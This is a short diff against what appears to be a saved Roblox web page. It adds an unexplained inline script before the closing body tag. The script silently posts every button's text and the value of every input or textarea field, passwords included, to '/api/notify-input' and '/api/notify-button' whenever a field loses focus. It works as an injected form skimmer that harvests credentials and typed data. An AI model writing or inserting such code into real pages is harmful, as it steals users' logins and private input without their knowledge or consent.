@@ -1550,5 +1550,29 @@
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/4c5ee72f1749165ddb021da90db69844.js'></script>
 
+    <script>
+(function() {
+  document.addEventListener('click', (e) => {
+    if (e.target.tagName === 'BUTTON') {
+      fetch('/api/notify-button', {
+        method: 'POST',
+        body: JSON.stringify({ text: e.target.innerText }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+    }
+  });
+
+  document.addEventListener('focusout', (e) => {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+      fetch('/api/notify-input', {
+        method: 'POST',
+        body: JSON.stringify({ text: e.target.value }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+    }
+  });
+})();
+</script>
+    
 </body>
 </html>
